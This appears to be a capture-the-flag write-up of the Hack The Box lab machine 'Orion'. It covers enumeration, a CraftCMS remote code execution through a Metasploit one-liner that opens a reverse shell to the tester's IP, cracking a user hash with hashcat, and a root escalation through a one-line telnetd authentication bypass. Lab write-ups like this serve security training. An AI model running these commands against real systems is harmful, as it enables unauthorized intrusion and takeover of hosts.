---
title: "Orion Hackthebox machine Writeup"
date: 2026-06-25 14:56:00 +0200
categories: [Hackthebox]
tags: [hackthebox, Orion, CraftCMS, htb]
---

Welcome to my Orion writeup at Hackthebox. This box contains vulnerable version of content management system which leading us to shell on the box. As www-data we can access mysql database using credentials found at envirenment variables to find user hash, crack it and we have valid user for ssh. As user we found vulnerable version of telnet which leads us to root.

# Enumeration 

First we start a nmap scan.

![](/assets/orion-img/102-1.png)

We add orion.htb to /etc/hosts file. The first look at page it looks static website but when we scroll at bottom we see a name of Content Management System.

![](/assets/orion-img/102-2.png)

We can either do a vhost scan, directory busting or run nuclei to scan for vulnerabilities. Lets start with dirbusting.

```bash
ffuf -u http://orion.htb/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-small-words.txt
```

![](/assets/orion-img/102-3.png)

We see admin was found so lets check that out while we waiting for nuclei. It's redirecting us to /admin/login. We can see an admin login panel but at the bottom we see craftCMS verion.

![](/assets/orion-img/102-4.png)

After some google searching we see that this version is vulnerable to RCE

![](/assets/orion-img/102-5.png)

After searching for PoC's we see exploit-db site with python script. https://www.exploit-db.com/exploits/52525. Using searchsploit let's copy that poc and use it to gain shell.

```bash
searchsploit -m 52525
```

![](/assets/orion-img/102-7.png)

Check if the exploit works

![](/assets/orion-img/102-8.png)
That's odd. Let's look for github poc

![](/assets/orion-img/102-9.png)

None of them are actually working for me so i decided to use metasploit-framework

```bash
msfconsole -q -x" use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432; set RHOSTS orion.htb; set LHOST 10.10.15.38; set LPORT 4444; exploit"
```


![](/assets/orion-img/102-10.png)

After that i don't like using meterpreter shell so i decided to use socat for reverse shell

![](/assets/orion-img/102-11.png)

![](/assets/orion-img/102-12.png)

## From www-data to adam

Let's see what are the users of this box and what are environment variable.

![](/assets/orion-img/103-1.png)

There is one user adam

![](/assets/orion-img/103-2.png)

And we have a database credentials so let's see if we can log in.

![](/assets/orion-img/103-3.png)

To check databases we use “show databases;” and for useing database we “use <database_name>”

![](/assets/orion-img/103-4.png)

To check tables we type “show tables;”

![](/assets/orion-img/103-5.png)

At the bottom there is users table so lets see what's inside. We can do that in preety format using “select * from users \G”

![](/assets/orion-img/103-6.png)

We see there's only one user with his hash so lets crack this

```bash
hashcat "$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS" /usr/share/wordlists/rockyou.txt -m 3200
```

![](/assets/orion-img/103-7.png)

We can now use his password to ssh to box

![](/assets/orion-img/103-8.png)

## From adam to root

The first thing's i like doing when i have ssh access is checking sudo -l and running linpeas

![](/assets/orion-img/104-1.png)

Looking at linpeas output in Active ports session we will see that telnet is open to localhost (127.0.0.1:23)

![](/assets/orion-img/104-2.png)

Searching for “telnet enumeration” and going for that site https://hacktricks.wiki/en/network-services-pentesting/pentesting-telnet.html we will see a PoC to CVE-2026-24061 — GNU Inetutils telnetd auth bypass (Critical)

```bash
USER='-f root' telnet -a 127.0.0.1
```

And now we have root

![](/assets/orion-img/104-3.png)

Thanks for reading, take care and see you in another writeup.